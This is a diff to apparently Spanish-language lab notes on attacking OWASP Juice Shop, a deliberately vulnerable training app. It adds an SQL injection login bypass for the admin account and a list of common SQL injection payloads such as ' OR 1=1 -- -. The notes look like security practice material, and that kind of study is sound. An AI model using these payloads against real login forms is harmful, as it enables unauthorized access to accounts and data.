@@ -10,6 +10,33 @@
 
 ++ Ataque #1 SQL Injection
 --- URL de Referencia: https://github.com/payloadbox/sql-injection-payload-list
---- Login email: bender@juice-sh.op'-- paswoord: <cualquier_caracter> 
+--- Login email: bender@juice-sh.op'-- pasword: <cualquier_caracter> 
+--- Login email: admin@juice-sh.op'-- password: <cualquier_caracter>
 ---- Nota: Los caracteres '-- después del correo hacen referencia al payload que nos permite realizar la injección sql y
 obtener el acceso usando cualquier contraseña
+---- Nota: Es posible usar otros payloads para comprobar cual de ellos funciona, listado de los payloads más comunes:
+    '
+    ''
+    `
+    ``
+    ,
+    "
+    ""
+    /
+    //
+    \
+    \\
+    ;
+    ' or "
+    -- or # 
+    ' OR '1
+    ' OR 1 -- -
+    " OR "" = "
+    " OR 1 = 1 -- -
+    ' OR '' = '
+    '='
+    'LIKE'
+    '=0--+
+     OR 1=1
+    ' OR 'x'='x
+    ' AND id IS NULL; --
